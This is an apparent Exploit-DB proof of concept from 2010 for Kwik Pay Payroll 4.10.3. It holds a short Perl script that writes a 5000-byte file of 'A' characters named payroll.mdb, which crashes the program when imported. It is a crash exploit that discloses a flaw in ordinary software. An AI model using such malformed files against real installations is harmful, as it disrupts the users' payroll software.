# Exploit Title: Kwik Pay Payroll .mdb Crash PoC
# Date: April 1, 2010
# Version: 4.10.3
# Tested on: Windows XP SP3
# Cost: 100.00 AU
# Author: [anonymous]
# Site: [http://www.setfreesecurity.com]
# 
# Usage: Run Script, Open the program
# File -> Import Payroll Data 
# Select From Data Source Drop-Down: Kwik-Pay Payroll Data 
# Browse and Import your .mdb File
#
# **********************************************
# ** It took 33 years to save my life         **
# ** thats 11 more years to make things right **
# **********************************************
# My hat goes off to the Exploit-DB Crew!
#!/usr/bin/perl
print "Broke as a Joke. . .\n";

my $data = "\x41" x 5000;
my $money = "payroll.mdb";

open (FILE, ">$money");
print FILE "$data";

print "\nShow me the money!\n";

